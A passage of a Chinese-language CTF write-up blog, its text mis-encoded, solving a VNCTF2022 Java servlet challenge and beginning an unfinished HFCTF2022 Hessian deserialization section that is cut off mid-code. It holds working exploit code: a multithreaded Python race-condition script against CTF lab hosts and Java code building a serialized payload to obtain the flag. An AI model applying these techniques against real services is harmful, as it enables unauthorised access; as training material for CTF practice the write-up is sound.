class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//User.class</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String height; <span class="hljs-comment">//æ³¨æ„heightè¢«transientä¿®é¥°äº†</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, String age, String height)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.height = height;<br>    &#125;<br><span class="hljs-comment">//HelloWorldServlet.class</span><br><span class="hljs-meta">@WebServlet(</span><br><span class="hljs-meta">    name = &quot;HelloServlet&quot;,</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/evi1&quot;&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;m4n_q1u_666&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">String</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;666&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">String</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;180&quot;</span>;<br>    User user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloWorldServlet</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-built_in">this</span>.user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.age, <span class="hljs-built_in">this</span>.height);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">reqName</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-keyword">if</span> (reqName != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.name = reqName;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;no vnctf2022!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>                <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;The Key is &quot;</span> + Secr3t.getKey());<br>            &#125;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;key&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;base64&quot;</span>);<br>        <span class="hljs-keyword">if</span> (Secr3t.getKey().equals(key) &amp;&amp; text != <span class="hljs-literal">null</span>) &#123;<br>            Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>            <span class="hljs-type">byte</span>[] textByte = decoder.decode(text);<br>            <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> (User)SerAndDe.deserialize(textByte);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.user.equals(u)) &#123;<br>                <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;Deserializeâ€¦â€¦ Flag is &quot;</span> + Secr3t.getFlag().toString());<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;KeyError&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <br><span class="hljs-comment">//checkæ–¹æ³•ï¼š</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String checkStr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;vnctf2022&quot;</span>.equals(checkStr))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>User</code>ç±»ä¸‹æœ‰ä¸‰ä¸ªå±æ€§ï¼š<code>name,age,height</code>ã€‚æ³¨æ„<code>height</code>è¿™ä¸œè¥¿è¢«<code>transient</code>ä¿®é¥°ï¼Œä¸å‚ä¸åºåˆ—åŒ–ã€‚</p><p>ç„¶å<code>doGet</code>è¿™ä¸ª<code>HttpServlet</code>ç±»ä¸­çš„æ–¹æ³•å­˜åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>        <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;no vnctf2022!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;The Key is &quot;</span> + Secr3t.getKey());<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸€ä¸ªçœ‹ä¼¼æœ‰é—®é¢˜çš„é€»è¾‘ï¼Œè¿™é‡Œè€ƒç‚¹æ˜¯<a href="https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">Servletçš„çº¿ç¨‹å®‰å…¨é—®é¢˜</a></p><p><code>Servlet</code>ç±»ä¸ä¼šæ¯æ¬¡æ”¶åˆ°è¯·æ±‚éƒ½ä¼šå»å®ä¾‹åŒ–ä¸€æ¬¡ã€‚å®ƒå¤„ç†è¯·æ±‚æ—¶æ˜¯åœ¨ç¬¬ä¸€æ¬¡å®ä¾‹åŒ–ä¸€ä¸ªç±»ï¼Œå½“åé¢å†æ¬¡è¯·æ±‚çš„æ—¶å€™ä¼šä½¿ç”¨ä¹‹å‰å®ä¾‹åŒ–çš„é‚£ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºå¤šä¸ªäººåŒæ—¶æ“ä½œä¸€ä¸ªå¯¹è±¡ã€‚è€Œè¿™ä¸ª<code>this.name</code>åˆšå¥½åˆ¤æ–­çš„æ˜¯å®ä¾‹åŒ–å¯¹è±¡çš„å±æ€§ã€‚</p><p>è¿™é‡Œå¯ä»¥ç”¨æ¡ä»¶ç«äº‰ï¼Œå¯ä»¥å¤šä¸ªçº¿ç¨‹å¼„å®ƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys  <span class="hljs-comment"># å¯¼å…¥ sys æ¨¡å—ï¼Œç”¨äºä¸ Python è§£é‡Šå™¨è¿›è¡Œäº¤äº’ï¼Œä¾‹å¦‚é€€å‡ºç¨‹åº</span><br><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># å¯¼å…¥ requests æ¨¡å—ï¼Œç”¨äºå‘é€ HTTP è¯·æ±‚</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># å¯¼å…¥ threading æ¨¡å—ï¼Œç”¨äºå¤šçº¿ç¨‹ç¼–ç¨‹</span><br><br><span class="hljs-comment"># å®šä¹‰ä¸¤ä¸ªç›®æ ‡ URL</span><br>url1 = <span class="hljs-string">&#x27;http://dadf610a-208a-46ee-8b31-092008f8f6ef.node4.buuoj.cn:81/evi1?name=vnctf2022&#x27;</span><br>url2 = <span class="hljs-string">&#x27;http://dadf610a-208a-46ee-8b31-092008f8f6ef.node4.buuoj.cn:81/evi1?name=foo&#x27;</span><br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªäº‹ä»¶å¯¹è±¡</span><br>event = threading.Event()<br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªå‚æ•° mode</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">go</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-comment"># ç­‰å¾…äº‹ä»¶è¢«è®¾ç½®</span><br>    event.wait()<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):  <span class="hljs-comment"># è¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯</span><br>        <span class="hljs-keyword">try</span>:  <span class="hljs-comment"># å°è¯•æ‰§è¡Œä»¥ä¸‹ä»£ç å—</span><br>            <span class="hljs-comment"># å‘é€ HTTP GET è¯·æ±‚</span><br>            r = requests.get(url1 <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> url2)<br>            <span class="hljs-comment"># å¦‚æœå“åº”æ–‡æœ¬ä¸­åŒ…å« &#x27;The Key is &#x27;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The Key is &#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-comment"># æ‰“å°å“åº”æ–‡æœ¬</span><br>                <span class="hljs-built_in">print</span>(r.text)<br>                <span class="hljs-comment"># é€€å‡ºç¨‹åºï¼Œè¿”å›çŠ¶æ€ç  1</span><br>                sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:  <span class="hljs-comment"># æ•è·å¼‚å¸¸</span><br>            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># å¿½ç•¥å¼‚å¸¸ï¼Œç»§ç»­æ‰§è¡Œå¾ªç¯</span><br><br><span class="hljs-comment"># å¦‚æœå½“å‰è„šæœ¬æ˜¯ä¸»æ¨¡å—</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># åˆ›å»º 30 ä¸ªçº¿ç¨‹å¹¶å¯åŠ¨å®ƒä»¬ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è°ƒç”¨ go å‡½æ•°ï¼Œä¼ å…¥å‚æ•° 1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        threading.Thread(target=go, args=(<span class="hljs-number">1</span>,)).start()<br>        <span class="hljs-comment"># åˆ›å»º 30 ä¸ªçº¿ç¨‹å¹¶å¯åŠ¨å®ƒä»¬ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è°ƒç”¨ go å‡½æ•°ï¼Œä¼ å…¥å‚æ•° 2</span><br>        threading.Thread(target=go, args=(<span class="hljs-number">2</span>,)).start()<br>    <span class="hljs-comment"># è®¾ç½®äº‹ä»¶ï¼Œé€šçŸ¥æ‰€æœ‰çº¿ç¨‹å¯ä»¥å¼€å§‹æ‰§è¡Œ</span><br>    event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä¸è¿™ä¹ˆéº»çƒ¦ï¼Œç›´æ¥<code>a.py</code>+<code>b.py</code>åŒæ—¶è·‘ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#a.py</span><br><span class="hljs-keyword">import</span> requests<br>host = <span class="hljs-string">&quot;http://ae396770-0931-4cc0-a719-448f093e1ebe.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = requests.get(host+<span class="hljs-string">&quot;evi1?name=asdqwer&quot;</span>)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;The Key is&quot;</span>)!=-<span class="hljs-number">1</span>:<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-keyword">if</span>(r.text.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)!=<span class="hljs-string">&quot;&quot;</span>):<br><span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-comment">#b.py</span><br><span class="hljs-keyword">import</span> requests<br>host = <span class="hljs-string">&quot;http://ae396770-0931-4cc0-a719-448f093e1ebe.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = requests.get(host+<span class="hljs-string">&quot;evi1?name=vnctf2022&quot;</span>)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;The Key is&quot;</span>)!=-<span class="hljs-number">1</span>:<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°<code>key</code>åå°±æ˜¯<code>doPost</code>æ–¹æ³•ä¸‹çš„é€»è¾‘ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;key&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;base64&quot;</span>);<br>    <span class="hljs-keyword">if</span> (Secr3t.getKey().equals(key) &amp;&amp; text != <span class="hljs-literal">null</span>) &#123;<br>        Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>        <span class="hljs-type">byte</span>[] textByte = decoder.decode(text);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> (User)SerAndDe.deserialize(textByte);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.user.equals(u)) &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;Deserializeâ€¦â€¦ Flag is &quot;</span> + Secr3t.getFlag().toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;KeyError&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>base64</code>å…ˆè§£ç ç„¶åååºåˆ—åŒ–ï¼Œç„¶åçœ‹ç»“æœæ˜¯å¦ç­‰äº<code>this.user</code>ã€‚ä½†æ³¨æ„<code>User</code>ç±»ä¸‹<code>heightè¢«transientä¿®é¥°</code>ã€‚æ‰€ä»¥éœ€è¦å¯¹<code>readObject</code>è¿›è¡Œé‡å†™ï¼Œç›´æ¥æŠŠè¿™ä¸ªæ–¹æ³•åŠ åœ¨<code>User.java</code>ä¸­å°±è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException&#123;<br> s.defaultWriteObject();<br> <span class="hljs-comment">//å¼ºåˆ¶åºåˆ—åŒ–name</span><br> s.writeObject(<span class="hljs-built_in">this</span>.height);<br>&#125;<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> entity;<span class="hljs-comment">//æ³¨æ„è¿™ä¸ªåŒ…è·¯å¾„ä¸èƒ½ä¹±å†™ï¼Œè¿™ä¹Ÿæ˜¯è¦åºåˆ—åŒ–çš„</span><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;m4n_q1u_666&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>,<span class="hljs-string">&quot;180&quot;</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(user);<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> encoder.encodeToString(bytes);<br>        System.out.println(s);<br>        <span class="hljs-comment">//rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å¯ä»¥æŠŠè¿™å­—ç¬¦ä¸²å†ååºåˆ—åŒ–ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> entity;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Der</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serializedObject</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=&quot;</span>;<br><br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(serializedObject);<br><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br><br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) objectInputStream.readObject();<br><br>        <span class="hljs-comment">// è¾“å‡ºååºåˆ—åŒ–åçš„å¯¹è±¡ä¿¡æ¯</span><br>        System.out.println(<span class="hljs-string">&quot;Deserialized User:&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Username: &quot;</span> + user.getName());<br>        System.out.println(<span class="hljs-string">&quot;Age: &quot;</span> + user.getAge());<br>        System.out.println(<span class="hljs-string">&quot;Height: &quot;</span> + user.getHeight());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Deserialized User:</span><br><span class="hljs-comment">//Username: m4n_q1u_666</span><br><span class="hljs-comment">//Age: 666</span><br><span class="hljs-comment">//Height: 180</span><br></code></pre></td></tr></table></figure><h2 id="HFCTF2022-ezchain-æœªå®Œæˆ"><a href="#HFCTF2022-ezchain-æœªå®Œæˆ" class="headerlink" title="[HFCTF2022]ezchain(æœªå®Œæˆ)"></a>[HFCTF2022]ezchain(æœªå®Œæˆ)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//index.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">queryMap</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.queryToMap(t.getRequestURI().getQuery());<br>            <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Welcome to HFCTF 2022&quot;</span>;<br>            <span class="hljs-keyword">if</span>(queryMap != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> (String)queryMap.get(<span class="hljs-string">&quot;token&quot;</span>);<br>                <span class="hljs-keyword">if</span>(Objects.hashCode(token) == <span class="hljs-string">&quot;HFCTF2022&quot;</span>.hashCode() &amp;&amp; !<span class="hljs-string">&quot;HFCTF2022&quot;</span>.equals(token)) &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> t.getRequestBody();<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(is).readObject();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                        response = <span class="hljs-string">&quot;oops! something is wrong&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    response = <span class="hljs-string">&quot;your token is wrong&quot;</span>;<br>                &#125;<br>            &#125;<br>            t.sendResponseHeaders(<span class="hljs-number">200</span>, ((<span class="hljs-type">long</span>)response.length()));<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125;<br>        <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">queryToMap</span><span class="hljs-params">(String query)</span> &#123;<br>            <span class="hljs-keyword">if</span>(query == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            String[] v5 = query.split(<span 